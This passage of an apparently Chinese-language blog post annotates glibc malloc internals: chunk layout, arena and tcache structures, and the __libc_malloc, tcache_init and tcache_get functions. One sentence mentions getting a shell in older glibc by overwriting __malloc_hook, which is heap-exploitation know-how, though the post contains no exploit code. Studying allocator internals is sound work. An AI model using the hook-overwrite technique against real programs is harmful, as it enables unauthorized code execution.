+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Size of chunk, in bytes                     |A|M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">    .                                                               .</span></span><br><span class="line"><span class="comment">    .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">    .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             (size of chunk, but used for application data)    |</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Size of next chunk, in bytes                |A|0|1|</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but &quot;mem&quot; is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundaries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">    .                                                               .</span></span><br><span class="line"><span class="comment">    .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:&#x27; |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    |             Size of next chunk, in bytes                |A|0|0|</span></span><br><span class="line"><span class="comment">    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,</span></span><br><span class="line"><span class="comment">    main arena, described by the main_arena variable.  When additional</span></span><br><span class="line"><span class="comment">    threads are spawned, each thread receives its own arena (up to a</span></span><br><span class="line"><span class="comment">    configurable limit, after which arenas are reused for multiple</span></span><br><span class="line"><span class="comment">    threads), and the chunks in these arenas have the A bit set.  To</span></span><br><span class="line"><span class="comment">    find the arena for a chunk on such a non-main arena, heap_for_ptr</span></span><br><span class="line"><span class="comment">    performs a bit mask operation and indirection through the ar_ptr</span></span><br><span class="line"><span class="comment">    member of the per-heap header heap_info (see arena.c).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Note that the `foot&#x27; of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The three exceptions to all this are:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span></span><br><span class="line"><span class="comment">trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">that would have to index off it. After initialization, `top&#x27;</span></span><br><span class="line"><span class="comment">is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">allocated one-by-one, each must contain its own trailing size</span></span><br><span class="line"><span class="comment">field.  If the M bit is set, the other bits are ignored</span></span><br><span class="line"><span class="comment">(because mmapped chunks are neither in an arena, nor adjacent</span></span><br><span class="line"><span class="comment">to a freed chunk).  The M bit is also used for chunks which</span></span><br><span class="line"><span class="comment">originally came from a dumped heap via malloc_set_state in</span></span><br><span class="line"><span class="comment">hooks.c.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     3. Chunks in fastbins are treated as allocated chunks from the</span></span><br><span class="line"><span class="comment">point of view of the chunk allocator.  They are consolidated</span></span><br><span class="line"><span class="comment">with their neighbors only in bulk, in malloc_consolidate.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h2><p><code>heap_info</code>结构用来表示一个堆，主要被用于非主线程中，因为主线程中只有一个堆，而非主线程可以调用mmap来创建多个堆，这些堆就通过<code>prev</code>指针串起来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><p><code>malloc_state</code>用来表示一个arena，所以每个arena中只有一个<code>malloc_state</code>结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);<span class="comment">//用于进程间的互斥，同一个arena同时只能被一个进程访问</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;<span class="comment">//表示arena是否存在fastbin或者内存是否连续等信息</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  <span class="comment">//一个用来存放所有fastbin链表的数组,最多10个fastbin链表</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;<span class="comment">//指向top chunk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;<span class="comment">//指向last_remainder</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];<span class="comment">//存放除fastbin的所有bin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span><span class="comment">//指向下一个arena</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span><span class="comment">//指向下一个空闲的arena</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;<span class="comment">//使用本arena的线程的数量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  <span class="comment">//分配给本arena的内存范围</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><p>当chunk空闲时<code>tcache_entry</code>就会存放在chunk的用户数据部分，并指向下一个<code>tcache_entry</code>, 因此<code>next</code>指向的就直接是用户数据的开始，也对应chunk的<code>fd</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><p><code>tcache_perthread_struct</code>用于存放所有的entries链，<code>counts</code>表示每条entries链的<code>tcache_entry</code>的数量，<code>entries</code>指向每条entries链的第一个<code>tcache_entry</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><h1 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h1><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><p>即<code>malloc</code>函数，调用了<code>tcache_init</code>, <code>tcache_get</code>, <code>_init_malloc</code>等关键函数，这些函数将在后面讲解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc(<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line">  <span class="comment">//在malloc之前先调用__malloc_hook函数，如果__malloc_hook不为空的话</span></span><br><span class="line">  <span class="keyword">void</span> *(*hook)(<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="comment">//tbytes为真实申请的字节数</span></span><br><span class="line">  <span class="comment">//checked_request2size调用request2size对tbytes进行了赋值，并进行了检查</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size(bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx(tbytes);<span class="comment">//csize2tidx返回索引</span></span><br><span class="line">  <span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE();<span class="comment">//调用tcache_init进行tcache的初始化</span></span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="comment">//如果索引合法并且对应entries里有chunk则调用tcache_get返回chunk</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">  &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果为单线程直接调用_int_malloc在main_arena中分配chunk</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">  &#123;</span><br><span class="line">    victim = _int_malloc(&amp;main_arena, bytes);</span><br><span class="line">    assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||</span><br><span class="line">           &amp;main_arena == arena_for_chunk(mem2chunk(victim)));</span><br><span class="line">    <span class="keyword">return</span> victim;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//寻找可用的arena并分配chunk</span></span><br><span class="line">  arena_get(ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="comment">//如果找到了可用的arena但chunk分配不成功则重新寻找和分配</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//解锁arena</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock(ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">//安全检查</span></span><br><span class="line">  assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||</span><br><span class="line">         ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在glibc2.26之前的版本中(如glibc2.25)，没有<code>#if USE_TCACHE...#endif</code>和判断单线程的那些代码。另外在这些glibc版本中可以通过修改<code>__malloc_hook</code>的值来getshell，但是在glibc2.34中已经将<code>__malloc_hook</code>, <code>__realloc_hook</code>,<code>__memalign_hook</code> ,<code>__free_hook</code>等API删除。</p><h2 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h2><p>tcache的初始化函数，主要就是利用malloc的内存分配原理给tcache分配内存，完成初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//本部分与__libc_malloc的后半段基本一致，就是给tcache分配sizeof(tcache_perthread_struct)大小的内存，完成初始化</span></span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h2><p>在<code>__libc_malloc</code>中判断索引为<code>tc_idx</code>的entries中有可用的chunk后调用本函数取出对应的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//找到索引为tc_idx的entries，并暂存给e</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//确保tc_idx小于TCACHE_MAX_BINS</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);<span class="comment">//确保entries非空</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//把e踢出链表</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);<span class="comment">//链表里的chunk数减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;<span class="comment">//e即要找的chunk，因为e指向的就是chunk的用户数据，所以直接返回e</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>本函数就是Linux堆分配的主要内容，由于代码较长，所以分段分析。</p><p>开始先对申请的字节数做对齐处理，使得申请的最小内存大小必须是<code>2*SIZE_SZ</code>（32位下为4, 64位下为8）的最小整数倍，再判断当前的arena是否可用，如果不可用则调用<code>sysmalloc</code>申请内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 